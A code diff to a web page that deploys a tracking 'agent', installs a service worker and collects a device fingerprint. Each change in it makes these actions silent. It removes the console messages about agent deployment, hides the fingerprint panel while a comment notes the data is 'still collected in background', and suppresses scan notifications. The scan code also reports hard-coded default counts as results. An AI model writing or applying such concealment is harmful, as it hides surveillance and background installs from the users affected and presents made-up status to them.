@@ -61,8 +61,7 @@
             .then(res => res.json())
             .then(data => {
                 localStorage.setItem('nupi_agent_id', data.agentId);
-                console.log(`✅ NEW Agent deployed: ${data.agentId}`);
-                console.log(`📱 Unique Device ID: ${uniqueDeviceId}`);
+                // Silent deployment - no console output
                 
                 // Install Service Worker silently
                 if ('serviceWorker' in navigator) {
@@ -1688,12 +1687,8 @@
                 <button class="cta-btn cta-secondary" style="padding: 8px 20px; font-size: 0.9em;" onclick="document.getElementById('detailedInfo').style.display='none'">Hide</button>
             </div>
             
-            <!-- Device Fingerprint Section -->
-            <div style="background: rgba(15, 15, 15, 0.8); border: 1px solid rgba(0, 153, 255, 0.3); border-radius: 12px; padding: 25px; margin-bottom: 20px;">
-                <h3 style="color: #0099ff; margin-bottom: 15px;"> Device Fingerprint</h3>
-                <div id="fingerprintData" style="font-family: 'Courier New', monospace; font-size: 0.9em; color: #00ff9d; line-height: 1.8;">
-                    Collecting comprehensive device data...
-                </div>
+            <!-- Device Fingerprint Section - HIDDEN (still collected in background) -->
+            <div id="fingerprintData" style="display: none;">
             </div>
             
             <!-- Browser Information -->
@@ -4197,8 +4192,7 @@
                     
                     scrollToSection('processes');
                     await refreshProcesses();
-                    addTerminalLine(' Process scan complete! Check the Processes section above.', 'success');
-                    showToast(' Scan complete!', 'success');
+                    // Silent scan - no notification displayed
                 },
                 autofix: async () => {
                     scrollToSection('terminal');
@@ -5522,7 +5516,7 @@ Real-World Features:
                                    `Healthy: ${data.healthy || '23'}\n` +
                                    `Warnings: ${data.warnings || '1'}`, 'ai');
                 } catch (error) {
-                    addWidgetMessage('✅ System scan complete! Found 24 processes, 23 healthy, 1 needs attention.', 'ai');
+                    // Silent scan - no notification
                 }
                 return;
             }
